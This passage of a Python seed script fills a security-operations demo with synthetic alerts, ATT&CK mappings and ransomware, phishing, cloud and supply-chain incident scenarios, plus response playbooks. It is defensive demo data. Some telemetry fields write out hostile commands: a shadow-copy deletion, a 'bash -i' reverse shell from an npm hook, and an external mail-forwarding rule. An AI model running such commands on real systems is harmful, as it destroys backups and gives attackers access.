"""Seed the database with a realistic demo tenant, user, and SOC dataset.

Run this from the host (the API container has the package on its PYTHONPATH):

    docker compose exec api python -m app.scripts.seed_demo
    # or, from the repo root:
    pnpm seed:demo

The seed is idempotent — running it twice produces the same dataset and never
duplicates rows. Demo IDs are kept in sync with `app/api/v1/dev_auth.py` so the
auth bypass and the seeded data agree on who "demo@tryaisoc.com" is.

Two modes:

* **Full seed** (default) — populates the canonical BOTS-shaped catalogue:
  15 hand-crafted ``INC-RT-*`` incidents (with one in-flight investigation
  on INC-RT-001), 28 randomised alerts, and the supporting connector set.
  This is what ``pnpm aisoc:demo`` runs and what the hosted demo ships.

* **Quick seed** (``--demo-quick``) — populates exactly four deterministic
  cases (DEMO-001 phishing, DEMO-002 cloud takeover, DEMO-003 insider exfil,
  DEMO-004 ransomware) with a fixed wall-clock so re-runs are byte-stable.
  This is the T6.4 screencast path — ``pnpm aisoc:demo --quick`` finishes
  in under 4 minutes on a warm laptop. ``_purge_demo_quick`` deletes the
  four DEMO-* cases before reseeding so re-running is a clean reset rather
  than a duplicate.
"""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import random
import sys
import uuid
from datetime import UTC, datetime, timedelta

from sqlalchemy import delete, select, text

from app.api.v1.dev_auth import (
    DEMO_TENANT_ID,
    DEMO_USER_EMAIL,
    DEMO_USER_ID,
    DEMO_USER_ROLE,
)
from app.core.security import get_password_hash
from app.db.database import AsyncSessionLocal
from app.models.alert import Alert
from app.models.case import Case, CaseTask, CaseTimeline
from app.models.connector import Connector
from app.models.investigation import (
    InvestigationArtifact,
    InvestigationEvent,
    InvestigationRun,
)
from app.models.tenant import Tenant, User

# Deterministic random for reproducible seeds.
_rng = random.Random(42)


# ─── Reference data ────────────────────────────────────────────────────────────

# Case severities stay on the legacy 4-tier ladder — we don't open cases for
# pure `info` noise, so leaving `info` off avoids polluting the queue. Alerts
# use the full 5-tier ladder (`_ALERT_SEVERITIES` below) so the seed exercises
# every band defined by the v1.5 SOC Console Parity plan (W2).
_SEVERITIES = ["critical", "high", "medium", "low"]
_ALERT_SEVERITIES = ["critical", "high", "medium", "low", "info"]
_STATUSES = ["new", "triaged", "investigating", "resolved", "false_positive"]

_SOURCES = [
    ("CrowdStrike Falcon", "edr"),
    ("Microsoft Defender", "edr"),
    ("Splunk Cloud", "siem"),
    ("Cortex XDR", "edr"),
    ("AWS GuardDuty", "cloud"),
    ("Cloudflare WAF", "network"),
    ("Suricata IDS", "network"),
    ("Okta", "identity"),
    ("Sigma Engine", "detection"),
]

_TECHNIQUES = [
    ("TA0001", "Initial Access", "T1078", "Valid Accounts"),
    ("TA0002", "Execution", "T1059.001", "PowerShell"),
    ("TA0003", "Persistence", "T1547.001", "Registry Run Keys"),
    ("TA0004", "Privilege Escalation", "T1068", "Exploit for Priv Esc"),
    ("TA0005", "Defense Evasion", "T1027", "Obfuscated Files"),
    ("TA0006", "Credential Access", "T1110.001", "Password Brute Force"),
    ("TA0007", "Discovery", "T1087.001", "Local Account Discovery"),
    ("TA0008", "Lateral Movement", "T1021.001", "Remote Desktop Protocol"),
    ("TA0009", "Collection", "T1005", "Data from Local System"),
    ("TA0010", "Exfiltration", "T1041", "Exfiltration Over C2 Channel"),
    ("TA0011", "Command and Control", "T1071.001", "Web Protocols"),
    ("TA0040", "Impact", "T1486", "Data Encrypted for Impact"),
]

_TITLES = [
    "Suspicious PowerShell encoded command on {host}",
    "Multiple failed logins for {user} from {ip}",
    "Possible ransomware behavior on {host}",
    "Credential dumping detected via lsass on {host}",
    "Unusual outbound traffic to {ip}",
    "TOR exit node connection from {host}",
    "Privilege escalation attempt for {user}",
    "Anomalous OAuth grant from {user}",
    "Data exfiltration to non-corp domain on {host}",
    "Suricata: ET TROJAN beacon detected on {host}",
    "AWS GuardDuty: UnauthorizedAccess:IAMUser/MaliciousIPCaller",
    "Suspicious office macro executed on {host}",
    "Kerberoasting attempt from {host}",
    "Lateral movement via SMB from {host} to DC",
    "Suspicious scheduled task creation on {host}",
    "LSASS memory dump via procdump on {host}",
    "Reverse shell via mshta.exe on {host}",
    "CloudTrail: root account API call from {ip}",
    "DLL side-loading in {host} AppData",
    "Suspicious WMI execution by {user} on {host}",
]

# 20 richly described synthetic incident scenarios for the eval suite.
# Each entry: (title_template, tactic_ids, technique_ids, description_template)
_SYNTHETIC_INCIDENTS: list[tuple[str, list[str], list[str], str]] = [
    (
        "Ransomware staging detected on {host} — precursor IOCs found",
        ["TA0002", "TA0005", "TA0040"],
        ["T1059.001", "T1027", "T1486"],
        "PowerShell dropper decoded and executed on {host}. Obfuscated payload staged in Temp. "
        "Ransomware note template found. Linked to LockBit 3.0 campaign.",
    ),
    (
        "APT credential harvesting campaign targeting {user}",
        ["TA0006", "TA0003"],
        ["T1110.001", "T1547.001"],
        "Brute-force spray from {ip} against {user}. Successful login established persistence via registry Run key. IoCs match APT28 TTPs.",
    ),
    (
        "Insider threat: bulk download of PII by {user}",
        ["TA0009", "TA0010"],
        ["T1005", "T1041"],
        "{user} downloaded >10 GB of customer records from internal DLP-monitored share. "
        "Traffic egressed to personal Google Drive from {host}.",
    ),
    (
        "Supply chain compromise: malicious npm package on {host}",
        ["TA0001", "TA0002"],
        ["T1195.001", "T1059.007"],
        "Compromised npm package `event-stream` installed by CI pipeline on {host}. Post-install hook executed reverse shell to {ip}.",
    ),
    (
        "Kerberoasting and lateral movement from {host}",
        ["TA0006", "TA0008"],
        ["T1558.003", "T1021.001"],
        "Service account TGS tickets requested en-masse from {host}. "
        "Pass-the-hash lateral movement to finance server. Mimikatz signatures detected.",
    ),
    (
        "Cloud misconfiguration: public S3 bucket with PII exposed",
        ["TA0009", "TA0010"],
        ["T1530", "T1567.002"],
        "S3 bucket `corp-hr-backups` set world-readable. 40 k employee records accessible. "
        "CloudTrail shows external IP {ip} enumerating objects.",
    ),
    (
        "Zero-day exploit attempt against web application on {host}",
        ["TA0001", "TA0002"],
        ["T1190", "T1059.007"],
        "WAF logs show SQL-injection and SSRF probes from {ip}. One request returned 200 with "
        "internal metadata. Possible CVE-2024-XXXX exploitation.",
    ),
    (
        "Living-off-the-land: certutil download cradle on {host}",
        ["TA0002", "TA0005"],
        ["T1105", "T1218.009"],
        "certutil.exe -urlcache invoked from cmd.exe spawned by outlook.exe. "
        "Payload downloaded from {ip}. Proxy logs confirm file retrieval.",
    ),
    (
        "Identity provider compromise: SAML golden-ticket on {user}",
        ["TA0006", "TA0007"],
        ["T1606.002", "T1087.002"],
        "Forged SAML assertion detected. Attacker pivoted to Azure AD as {user}. Account enumeration across O365 tenant followed.",
    ),
    (
        "Cryptominer dropped via vulnerable Docker socket on {host}",
        ["TA0001", "TA0002", "TA0040"],
        ["T1610", "T1059.004", "T1496"],
        "Unauthenticated Docker API exploited. Container with XMRig spawned. "
        "CPU usage spiked to 95%. Monero mining pool connections from {ip}.",
    ),
    (
        "DGA-based C2 traffic from {host} — Emotet botnet indicators",
        ["TA0011", "TA0010"],
        ["T1568.002", "T1041"],
        "Domain generation algorithm (DGA) traffic observed from {host}. "
        "200+ NXDomain replies per minute. IoCs match Emotet epoch 5 infrastructure.",
    ),
    (
        "BEC phishing: finance user {user} redirected payment",
        ["TA0001", "TA0040"],
        ["T1566.001", "T1657"],
        "Spear-phishing email spoofed CFO. {user} clicked malicious link, credentials stolen. "
        "Wire transfer of $250 k initiated to threat-actor account.",
    ),
    (
        "Active Directory DCSync from non-DC host {host}",
        ["TA0006", "TA0004"],
        ["T1003.006", "T1078.002"],
        "Replication rights abused from workstation {host}. All domain NTLM hashes replicated. Matches skeleton key attack preparation.",
    ),
    (
        "Container escape via privileged pod on {host}",
        ["TA0004", "TA0007"],
        ["T1611", "T1082"],
        "Kubernetes privileged pod created by rogue service account. cgroup escape to host namespace. Node file system accessed from pod.",
    ),
    (
        "Firmware implant detected on {host} UEFI partition",
        ["TA0003", "TA0005"],
        ["T1542.001", "T1027.002"],
        "UEFI secure-boot violation alert. Unknown module in firmware image. Matches MosaicRegressor UEFI implant signatures.",
    ),
    (
        "Watering-hole attack: internal wiki delivering drive-by exploit",
        ["TA0001", "TA0002"],
        ["T1189", "T1203"],
        "Internal Confluence page injected with malicious JS. Visitor {user} on {host} exploited via CVE-2024-1234 browser vulnerability.",
    ),
    (
        "Malicious USB autorun on air-gapped {host}",
        ["TA0001", "TA0009"],
        ["T1091", "T1005"],
        "USB device inserted on air-gapped system {host}. AutoRun executed Python stager. Sensitive documents staged for exfiltration.",
    ),
    (
        "OAuth consent phishing targeting {user}'s Microsoft account",
        ["TA0001", "TA0006"],
        ["T1528", "T1550.001"],
        "Malicious OAuth app granted Mail.Read and Files.Read.All to {user}. Inbox rules created to forward emails silently to attacker.",
    ),
    (
        "Memory-only implant (fileless) executed in {host} process",
        ["TA0002", "TA0005"],
        ["T1055.012", "T1620"],
        "Process hollowing detected: svchost.exe replaced with Cobalt Strike beacon. No disk artefacts. IoC matches CS watermark 0x5A4D.",
    ),
    (
        "DNS tunnelling for data exfiltration from {host}",
        ["TA0011", "TA0010"],
        ["T1071.004", "T1048.003"],
        "DNS query volume from {host} 50× baseline. TXT records contain base64 payload. "
        "Matches iodine/dnscat2 tool signatures. Exfil volume ~200 MB.",
    ),
]

_HOSTS = [
    "WIN-FIN-DB01",
    "WIN-PROD-WEB02",
    "MAC-SARAH-LT",
    "LIN-K8S-NODE-03",
    "WIN-HR-DESKTOP",
    "DC01.corp.example.com",
    "WIN-DEVOPS-LT",
]

_USERS = [
    "alice@example.com",
    "bob@example.com",
    "carol@example.com",
    "dave@example.com",
    "svc-backup@example.com",
    "eve@example.com",
]


# ─── Realistic incidents (BOTS / SecRepo-shaped) ───────────────────────────────
#
# 15 named, parameterised incident scenarios that ride on top of the random
# `_make_alert` corpus. Each scenario emits 1–3 alerts with telemetry shaped like
# Splunk BOTS / SecRepo public datasets (Sysmon, CloudTrail, Okta system log,
# Suricata, kube:audit, etc.) so investigators in the demo see field names they
# already recognise. The first scenario (INC-RT-001 LockBit 3.0) is the
# "in-flight investigation" showcase — see `_seed_in_flight_investigation`.

_REALISTIC_INCIDENTS: list[dict] = [
    {
        "key": "INC-RT-001",
        "title": "LockBit 3.0 ransomware lateral spread on WIN-FIN-DB01",
        "description": (
            "Service account `svc-backup` triggered shadow-copy deletion, ransom-note "
            "drop and SMB lateral movement to FIN-DB02. CrowdStrike encryption-pattern "
            "detector fired against ~12k files. Investigation is in-flight; host is "
            "being isolated."
        ),
        "severity": "critical",
        "status": "in_progress",
        "host": "WIN-FIN-DB01",
        "user": "svc-backup@example.com",
        "src_ip": "203.0.113.42",
        "tactic_ids": ["TA0002", "TA0005", "TA0008", "TA0040"],
        "technique_ids": ["T1059.001", "T1027", "T1021.002", "T1486"],
        "tags": ["ransomware", "lockbit", "in_flight", "showcase"],
        "alerts": [
            {
                "title": "Sysmon: vssadmin shadow-copy deletion on WIN-FIN-DB01",
                "severity": "critical",
                "source": "Microsoft Sysmon",
                "category": "edr",
                "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
                "process": "vssadmin.exe",
                "ai_score": 0.97,
                "extra": {
                    "EventID": 1,
                    "ProcessId": 4892,
                    "ParentImage": r"C:\Windows\System32\cmd.exe",
                    "Image": r"C:\Windows\System32\vssadmin.exe",
                    "CommandLine": "vssadmin delete shadows /all /quiet",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "Hashes": "SHA256=4DA1F312A214C07143ABEEAFB695D904",
                },
            },
            {
                "title": "CrowdStrike: high-volume file modification pattern on WIN-FIN-DB01",
                "severity": "critical",
                "source": "CrowdStrike Falcon",
                "category": "edr",
                "sourcetype": "crowdstrike:falcon:json",
                "process": "explorer.exe",
                "ai_score": 0.96,
                "extra": {
                    "DetectId": "ldt:abc123:lockbit-encrypt",
                    "PatternDispositionDescription": "Prevention, process killed.",
                    "Severity": 5,
                    "Tactic": "Impact",
                    "Technique": "Data Encrypted for Impact",
                    "FilesModified": 12384,
                    "FileExtensionWritten": ".lockbit",
                    "ComputerName": "WIN-FIN-DB01",
                    "UserName": "svc-backup",
                },
            },
            {
                "title": "WinEventLog: SMB lateral connection to FIN-DB02 from WIN-FIN-DB01",
                "severity": "high",
                "source": "Windows Security",
                "category": "siem",
                "sourcetype": "WinEventLog:Security",
                "process": "lsass.exe",
                "ai_score": 0.83,
                "extra": {
                    "EventCode": 4624,
                    "LogonType": 3,
                    "TargetUserName": "svc-backup",
                    "WorkstationName": "WIN-FIN-DB01",
                    "IpAddress": "10.42.1.87",
                    "TargetServerName": "FIN-DB02",
                    "AuthenticationPackageName": "NTLM",
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "ransomware-containment-v3",
            "playbook_name": "Ransomware Containment & Eradication",
            "status": "running",
            "context": {
                "incident_severity": "critical",
                "host": "WIN-FIN-DB01",
                "user": "svc-backup@example.com",
                "trigger": "ransomware-encryption-pattern",
            },
            "steps": [
                (
                    "isolate-host",
                    "Isolate host via CrowdStrike RTR",
                    "completed",
                    {"action": "endpoint.isolate", "target": "WIN-FIN-DB01", "result": "contained", "duration_ms": 4_120},
                ),
                (
                    "snapshot-disk",
                    "Capture forensic disk image to S3",
                    "completed",
                    {"action": "endpoint.snapshot", "target": "WIN-FIN-DB01", "snapshot_id": "snap-0c7f1aa9", "duration_ms": 96_350},
                ),
                (
                    "block-c2",
                    "Block known LockBit C2 ranges on perimeter",
                    "completed",
                    {"action": "network.block_ip", "targets": ["203.0.113.42", "198.51.100.71"], "duration_ms": 2_980},
                ),
                (
                    "kill-encryption-process",
                    "Kill encryption process on host",
                    "running",
                    {"action": "endpoint.kill_process", "process_name": "lockbit.exe", "started_at_offset_s": 240},
                ),
                ("rotate-credentials", "Rotate svc-backup credentials in AD + secrets vault", "pending", {}),
                ("notify-stakeholders", "Open ticket, page incident commander, notify legal", "pending", {}),
            ],
        },
        "in_flight_investigation": True,
    },
    {
        "key": "INC-RT-002",
        "title": "BEC + wire-fraud chain via OAuth-consent phishing of bob@example.com",
        "description": (
            "Spear-phishing email impersonating CFO led `bob@example.com` to consent "
            "to a malicious OAuth app. Inbox-rule auto-forwarded all CFO threads to an "
            "external mailbox; a $250k wire transfer was initiated and reversed by "
            "treasury before clearing."
        ),
        "severity": "critical",
        "status": "resolved",
        "host": "MAC-BOB-LT",
        "user": "bob@example.com",
        "src_ip": "185.199.108.153",
        "tactic_ids": ["TA0001", "TA0006", "TA0040"],
        "technique_ids": ["T1566.001", "T1528", "T1657"],
        "tags": ["phishing", "bec", "oauth", "finance"],
        "alerts": [
            {
                "title": "Microsoft 365: Add OAuth2PermissionGrant for `Acme Calendar Sync`",
                "severity": "high",
                "source": "Microsoft 365",
                "category": "saas",
                "sourcetype": "o365:management:activity",
                "process": "AzureActiveDirectory",
                "ai_score": 0.91,
                "extra": {
                    "Operation": "Consent to application.",
                    "ApplicationDisplayName": "Acme Calendar Sync",
                    "ConsentContext.IsAdminConsent": False,
                    "ScopeRequested": "Mail.Read Files.Read.All offline_access",
                    "UserId": "bob@example.com",
                    "ClientIP": "185.199.108.153",
                },
            },
            {
                "title": "Microsoft 365: New-InboxRule auto-forwards CFO threads externally",
                "severity": "high",
                "source": "Microsoft 365",
                "category": "saas",
                "sourcetype": "o365:management:activity",
                "process": "Exchange",
                "ai_score": 0.88,
                "extra": {
                    "Operation": "New-InboxRule",
                    "Parameters": [
                        {"Name": "From", "Value": "cfo@example.com"},
                        {"Name": "ForwardTo", "Value": "treasury-update@gnail-acme.com"},
                        {"Name": "DeleteMessage", "Value": "True"},
                    ],
                    "UserId": "bob@example.com",
                    "ClientIP": "185.199.108.153",
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "bec-response-v2",
            "playbook_name": "BEC / Wire-Fraud Response",
            "status": "completed",
            "context": {
                "victim_user": "bob@example.com",
                "wire_amount_usd": 250_000,
                "wire_status": "recalled",
            },
            "steps": [
                (
                    "revoke-oauth-grant",
                    "Revoke malicious OAuth grant",
                    "completed",
                    {"action": "saas.revoke_oauth", "app": "Acme Calendar Sync", "duration_ms": 3_400},
                ),
                (
                    "delete-inbox-rule",
                    "Delete malicious inbox rule",
                    "completed",
                    {"action": "saas.delete_inbox_rule", "duration_ms": 2_100},
                ),
                (
                    "force-mfa-reset",
                    "Force MFA + password reset for bob@example.com",
                    "completed",
                    {"action": "identity.force_mfa", "duration_ms": 5_780},
                ),
                (
                    "notify-treasury",
                    "Notify treasury to recall wire",
                    "completed",
                    {"action": "ticket.create", "system": "ServiceNow", "ticket": "INC0019823"},
                ),
                ("ioc-share", "Share sender IPs with TIP", "completed", {"action": "tip.share"}),
            ],
        },
    },
    {
        "key": "INC-RT-003",
        "title": "Okta credential stuffing → first-success login for alice@example.com",
        "description": (
            "Okta saw 412 failed logins for `alice@example.com` from 38 distinct IPs in "
            "9 minutes (rotating residential proxies), followed by a single successful "
            "login + MFA-push approval from a never-seen device."
        ),
        "severity": "high",
        "status": "in_progress",
        "host": "WIN-HR-DESKTOP",
        "user": "alice@example.com",
        "src_ip": "45.155.205.88",
        "tactic_ids": ["TA0006", "TA0001"],
        "technique_ids": ["T1110.004", "T1078.004"],
        "tags": ["identity", "credential-stuffing", "okta"],
        "alerts": [
            {
                "title": "Okta: 412 failed logins for alice@example.com in 9 min",
                "severity": "high",
                "source": "Okta",
                "category": "identity",
                "sourcetype": "okta:im",
                "process": "okta.policy.evaluate_sign_on",
                "ai_score": 0.92,
                "extra": {
                    "eventType": "user.session.start",
                    "outcome": {"result": "FAILURE", "reason": "INVALID_CREDENTIALS"},
                    "actor": {"alternateId": "alice@example.com"},
                    "client": {"ipAddress": "45.155.205.88", "userAgent": "Mozilla/5.0"},
                    "failure_count": 412,
                    "distinct_ips": 38,
                },
            },
            {
                "title": "Okta: first successful login from new device — alice@example.com",
                "severity": "high",
                "source": "Okta",
                "category": "identity",
                "sourcetype": "okta:im",
                "process": "okta.policy.evaluate_sign_on",
                "ai_score": 0.84,
                "extra": {
                    "eventType": "user.session.start",
                    "outcome": {"result": "SUCCESS"},
                    "actor": {"alternateId": "alice@example.com"},
                    "client": {"ipAddress": "45.155.205.88", "device": "Unknown"},
                    "authenticationContext": {"authenticationStep": 1},
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "account-takeover-v1",
            "playbook_name": "Account Takeover Response",
            "status": "running",
            "context": {"target_user": "alice@example.com"},
            "steps": [
                (
                    "suspend-session",
                    "Suspend Okta session for user",
                    "completed",
                    {"action": "identity.suspend_session", "duration_ms": 1_900},
                ),
                ("force-mfa", "Force step-up MFA on next login", "completed", {"action": "identity.force_mfa", "duration_ms": 1_200}),
                ("rotate-app-tokens", "Revoke OAuth refresh tokens", "running", {}),
                ("alert-user", "Page user for verification", "pending", {}),
            ],
        },
    },
    {
        "key": "INC-RT-004",
        "title": "AWS IAM key leak → S3 enumeration + GetObject from external IP",
        "description": (
            "GuardDuty fired `UnauthorizedAccess:IAMUser/MaliciousIPCaller`. CloudTrail "
            "shows the key listing buckets and pulling objects from `corp-hr-backups` "
            "from a non-corp IP. Key has been disabled."
        ),
        "severity": "high",
        "status": "in_progress",
        "host": "ec2-build-worker-09",
        "user": "iam-user/build-runner",
        "src_ip": "104.244.42.193",
        "tactic_ids": ["TA0006", "TA0009", "TA0010"],
        "technique_ids": ["T1078.004", "T1530", "T1567.002"],
        "tags": ["aws", "cloud", "iam", "s3"],
        "alerts": [
            {
                "title": "AWS GuardDuty: UnauthorizedAccess:IAMUser/MaliciousIPCaller",
                "severity": "high",
                "source": "AWS GuardDuty",
                "category": "cloud",
                "sourcetype": "aws:guardduty",
                "process": "guardduty.finding",
                "ai_score": 0.93,
                "extra": {
                    "type": "UnauthorizedAccess:IAMUser/MaliciousIPCaller",
                    "severity": 8,
                    "resource": {"accessKeyDetails": {"userName": "build-runner"}},
                    "service": {"action": {"awsApiCallAction": {"api": "ListBuckets"}}},
                    "remoteIpDetails": {"ipAddressV4": "104.244.42.193", "country": {"countryName": "Romania"}},
                },
            },
            {
                "title": "CloudTrail: GetObject burst from build-runner — corp-hr-backups",
                "severity": "high",
                "source": "AWS CloudTrail",
                "category": "cloud",
                "sourcetype": "aws:cloudtrail",
                "process": "s3.amazonaws.com",
                "ai_score": 0.87,
                "extra": {
                    "eventName": "GetObject",
                    "eventSource": "s3.amazonaws.com",
                    "userIdentity": {"type": "IAMUser", "userName": "build-runner"},
                    "sourceIPAddress": "104.244.42.193",
                    "requestParameters": {"bucketName": "corp-hr-backups"},
                    "object_count_5min": 312,
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "aws-key-compromise-v2",
            "playbook_name": "AWS Access-Key Compromise",
            "status": "running",
            "context": {"iam_user": "build-runner"},
            "steps": [
                ("disable-key", "Deactivate IAM access key", "completed", {"action": "aws.iam.deactivate_key", "duration_ms": 2_900}),
                ("rotate-key", "Issue replacement key for service", "completed", {"action": "aws.iam.create_key", "duration_ms": 3_400}),
                ("block-ip", "Add NACL block for malicious IP", "completed", {"action": "aws.nacl.deny", "ip": "104.244.42.193"}),
                ("audit-bucket-access", "Audit corp-hr-backups access", "running", {}),
            ],
        },
    },
    {
        "key": "INC-RT-005",
        "title": "Insider exfil: 12 GB customer-PII upload to personal Drive",
        "description": (
            "DLP flagged `dave@example.com` zipping 12 GB of customer PII from the HR "
            "share and uploading to a personal Google Drive. Egress proxy blocked the "
            "second batch; first batch (4.2 GB) reached external."
        ),
        "severity": "high",
        "status": "resolved",
        "host": "WIN-HR-DESKTOP",
        "user": "dave@example.com",
        "src_ip": "10.42.7.119",
        "tactic_ids": ["TA0009", "TA0010"],
        "technique_ids": ["T1005", "T1567.002"],
        "tags": ["insider", "dlp", "exfiltration"],
        "alerts": [
            {
                "title": "DLP: 12 GB PII archive uploaded to drive.google.com",
                "severity": "high",
                "source": "Cloudflare WAF",
                "category": "network",
                "sourcetype": "cloudflare:dlp",
                "process": "chrome.exe",
                "ai_score": 0.89,
                "extra": {
                    "policy": "PII-Customer-Records",
                    "action": "BLOCK",
                    "user": "dave@example.com",
                    "source_host": "WIN-HR-DESKTOP",
                    "destination_host": "drive.google.com",
                    "bytes_blocked": 8_321_000_000,
                    "bytes_pre_block": 4_200_000_000,
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "insider-exfil-v1",
            "playbook_name": "Insider Exfiltration Containment",
            "status": "completed",
            "context": {"actor": "dave@example.com"},
            "steps": [
                ("revoke-saas-tokens", "Revoke Google + Slack tokens", "completed", {"duration_ms": 4_300}),
                ("disable-account", "Disable AD + Okta accounts", "completed", {"duration_ms": 6_800}),
                ("preserve-evidence", "Capture endpoint forensic image", "completed", {"duration_ms": 145_000}),
                ("notify-hr-legal", "Notify HR + outside counsel", "completed", {"duration_ms": 800}),
                ("dlp-rule-tighten", "Tighten DLP egress rules for PII", "completed", {"duration_ms": 2_400}),
            ],
        },
    },
    {
        "key": "INC-RT-006",
        "title": "Compromised npm package `event-stream-helper` — reverse shell from CI runner",
        "description": (
            "Build pipeline on `LIN-K8S-NODE-03` installed `event-stream-helper@2.0.4` "
            "whose post-install hook spawned a reverse shell to 5.39.222.7. The package "
            "was unpublished from the registry 18 minutes after install."
        ),
        "severity": "high",
        "status": "in_progress",
        "host": "LIN-K8S-NODE-03",
        "user": "ci-runner",
        "src_ip": "5.39.222.7",
        "tactic_ids": ["TA0001", "TA0002", "TA0011"],
        "technique_ids": ["T1195.002", "T1059.004", "T1071.001"],
        "tags": ["supply-chain", "npm", "ci"],
        "alerts": [
            {
                "title": "auditd: bash -i reverse shell spawned from npm post-install",
                "severity": "high",
                "source": "Suricata IDS",
                "category": "edr",
                "sourcetype": "linux:auditd",
                "process": "/bin/bash",
                "ai_score": 0.94,
                "extra": {
                    "type": "EXECVE",
                    "exe": "/bin/bash",
                    "argv": ["bash", "-i"],
                    "ppid_exe": "/usr/bin/node",
                    "ppid_argv": ["node", "/app/node_modules/event-stream-helper/postinstall.js"],
                    "uid": 1001,
                    "auid": 1001,
                },
            },
            {
                "title": "Suricata: outbound TCP 4444 to 5.39.222.7 from LIN-K8S-NODE-03",
                "severity": "high",
                "source": "Suricata IDS",
                "category": "network",
                "sourcetype": "suricata:alert",
                "process": "node",
                "ai_score": 0.86,
                "extra": {
                    "alert": {
                        "signature": "ET POLICY Possible reverse shell to 5.39.222.7",
                        "category": "Potentially Bad Traffic",
                        "severity": 1,
                    },
                    "src_ip": "10.0.4.91",
                    "dest_ip": "5.39.222.7",
                    "dest_port": 4444,
                    "proto": "TCP",
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "supply-chain-npm-v1",
            "playbook_name": "Supply-Chain (npm) Containment",
            "status": "running",
            "context": {"package": "event-stream-helper@2.0.4"},
            "steps": [
                ("kill-runner-pods", "Cordon + drain affected K8s pods", "completed", {"duration_ms": 12_400}),
                ("block-c2", "Block 5.39.222.7 at egress firewall", "completed", {"duration_ms": 2_500}),
                ("pin-deps", "Pin lockfile to last-known-good", "running", {}),
                ("scan-other-builds", "Scan last 14d builds for the package", "pending", {}),
            ],
        },
    },
    {
        "key": "INC-RT-007",
        "title": "Cobalt Strike beacon + DNS C2 from WIN-DEVOPS-LT",
        "description": (
            "Suricata flagged a CS Malleable C2 profile on outbound traffic, while "
            "Sysmon recorded process injection (svchost ↔ rundll32) and DNS queries "
            "with TXT-record payloads to `azonly-cdn.io`."
        ),
        "severity": "critical",
        "status": "in_progress",
        "host": "WIN-DEVOPS-LT",
        "user": "carol@example.com",
        "src_ip": "10.0.5.27",
        "tactic_ids": ["TA0005", "TA0011"],
        "technique_ids": ["T1055.012", "T1071.004"],
        "tags": ["cobalt-strike", "c2", "dns"],
        "alerts": [
            {
                "title": "Suricata: ET TROJAN Cobalt Strike Malleable C2 profile",
                "severity": "critical",
                "source": "Suricata IDS",
                "category": "network",
                "sourcetype": "suricata:alert",
                "process": "rundll32.exe",
                "ai_score": 0.95,
                "extra": {
                    "alert": {
                        "signature": "ET TROJAN Observed CobaltStrike Malleable C2 (Profile)",
                        "category": "Trojan Activity",
                        "severity": 1,
                    },
                    "src_ip": "10.0.5.27",
                    "dest_ip": "23.106.222.74",
                    "dest_port": 443,
                    "proto": "TCP",
                },
            },
            {
                "title": "Sysmon: process-injection from svchost.exe to rundll32.exe",
                "severity": "critical",
                "source": "Microsoft Sysmon",
                "category": "edr",
                "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
                "process": "svchost.exe",
                "ai_score": 0.91,
                "extra": {
                    "EventID": 8,  # CreateRemoteThread
                    "SourceImage": r"C:\Windows\System32\svchost.exe",
                    "TargetImage": r"C:\Windows\System32\rundll32.exe",
                    "TargetProcessId": 6712,
                },
            },
            {
                "title": "DNS: 220 TXT-record queries to azonly-cdn.io in 60s",
                "severity": "high",
                "source": "Suricata IDS",
                "category": "network",
                "sourcetype": "dns:bro",
                "process": "rundll32.exe",
                "ai_score": 0.81,
                "extra": {
                    "qname": "azonly-cdn.io",
                    "qtype_name": "TXT",
                    "qcount": 220,
                    "answers_avg_len": 248,
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "c2-containment-v1",
            "playbook_name": "C2 Beacon Containment",
            "status": "running",
            "context": {"host": "WIN-DEVOPS-LT", "framework": "cobalt-strike"},
            "steps": [
                ("isolate-host", "Isolate host via Defender", "completed", {"action": "endpoint.isolate", "duration_ms": 3_900}),
                ("block-c2-ip", "Block 23.106.222.74", "completed", {"duration_ms": 1_700}),
                ("dns-sinkhole", "Sinkhole azonly-cdn.io", "running", {}),
                ("memory-capture", "Capture memory image for analysis", "pending", {}),
            ],
        },
    },
    {
        "key": "INC-RT-008",
        "title": "Kerberoasting + DCSync attempt from WIN-DEVOPS-LT against DC01",
        "description": (
            "Bulk TGS-REQ for SPNs with weak crypto, followed by an attempted "
            "DCSync (DRSReplicaSync) call from a non-DC host. Domain controller "
            "rejected the call but the attempt is high-confidence."
        ),
        "severity": "critical",
        "status": "open",
        "host": "WIN-DEVOPS-LT",
        "user": "carol@example.com",
        "src_ip": "10.0.5.27",
        "tactic_ids": ["TA0006", "TA0004"],
        "technique_ids": ["T1558.003", "T1003.006"],
        "tags": ["ad", "kerberoast", "dcsync"],
        "alerts": [
            {
                "title": "WinEventLog: 87 Kerberos TGS requests (RC4) in 2 min",
                "severity": "high",
                "source": "Windows Security",
                "category": "siem",
                "sourcetype": "WinEventLog:Security",
                "process": "lsass.exe",
                "ai_score": 0.88,
                "extra": {
                    "EventCode": 4769,
                    "TicketEncryptionType": "0x17",
                    "ServiceName": "MSSQLSvc/finance-db.corp.example.com",
                    "TargetUserName": "carol@example.com",
                    "request_count": 87,
                },
            },
            {
                "title": "WinEventLog: DRSReplicaSync from non-DC host WIN-DEVOPS-LT",
                "severity": "critical",
                "source": "Windows Security",
                "category": "siem",
                "sourcetype": "WinEventLog:Security",
                "process": "lsass.exe",
                "ai_score": 0.96,
                "extra": {
                    "EventCode": 4662,
                    "Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",  # DS-Replication-Get-Changes
                    "AccessMask": "0x100",
                    "WorkstationName": "WIN-DEVOPS-LT",
                    "TargetServer": "DC01.corp.example.com",
                },
            },
        ],
    },
    {
        "key": "INC-RT-009",
        "title": "OAuth-consent phishing of carol@example.com (Microsoft 365)",
        "description": (
            "Malicious app `Internal IT Support` requested Mail.ReadWrite + "
            "Files.Read.All. Consent was granted then revoked; mailbox audit shows no "
            "downloads, but creator inbox-rule was added."
        ),
        "severity": "medium",
        "status": "resolved",
        "host": "MAC-CAROL-LT",
        "user": "carol@example.com",
        "src_ip": "192.0.2.55",
        "tactic_ids": ["TA0001", "TA0006"],
        "technique_ids": ["T1528"],
        "tags": ["oauth", "phishing", "m365"],
